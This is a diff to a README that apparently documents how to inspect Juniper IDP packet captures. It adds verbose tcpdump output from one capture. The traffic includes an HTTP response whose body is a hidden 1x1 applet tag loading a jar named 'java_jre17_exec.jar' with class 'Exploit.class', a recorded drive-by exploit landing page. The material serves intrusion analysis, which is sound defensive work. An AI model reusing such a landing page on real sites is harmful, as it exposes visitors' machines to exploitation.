@@ -66,5 +66,25 @@ total 12K
 
 Transfer and/or analyze with your favourite packet-analysis tool (Wireshark, tcpdump, tshark, etc)
 ```
-admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:STC:JAVA:APPLET-CLASS-FILE$ tcpdump -r 1484344180-229-2.pcap
+admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:STC:JAVA:APPLET-CLASS-FILE$ tcpdump -r 1484344180-229-2.pcap -vv
+reading from file 1484344180-229-2.pcap, link-type EN10MB (Ethernet)
+-5:00:00.000000 IP (tos 0x0, ttl 51, id 59053, offset 0, flags [none], proto TCP (6), length 40)
+    vhost.phx1.nearlyfreespeech.net.http > 10.1.1.10.63009: Flags [.], cksum 0x5e13 (correct), seq 3215153248, ack 4131619491, win 31461, length 0
+-5:00:00.010000 IP (tos 0x0, ttl 51, id 59056, offset 0, flags [none], proto TCP (6), length 478)
+    vhost.phx1.nearlyfreespeech.net.http > 10.1.1.10.63009: Flags [P.], cksum 0x0704 (correct), seq 0:438, ack 1, win 32120, length 438: HTTP, length: 438
+	HTTP/1.1 200 OK
+	Last-Modified: Fri, 09 Nov 2012 05:34:59 GMT
+	Accept-Ranges: bytes
+	Content-Length: 129
+	Content-Type: text/html; charset=UTF-8
+	Date: Fri, 13 Jan 2017 21:49:40 GMT
+	Server: Apache
+	ETag: "81-4ce094fff46c0"
+	Age: 0
+	Via: 1.1 vhost.phx5.nearlyfreespeech.net (squid)
+	Connection: keep-alive
+	
+	<html><head></head><body><applet archive="java_jre17_exec.jar" code="Exploit.class" width="1" height="1"></applet></body></html>
+-5:00:00.020000 IP (tos 0x0, ttl 128, id 1498, offset 0, flags [DF], proto TCP (6), length 40)
+    10.1.1.10.63009 > vhost.phx1.nearlyfreespeech.net.http: Flags [.], cksum 0xde07 (correct), seq 1, ack 438, win 63802, length 0
 ```
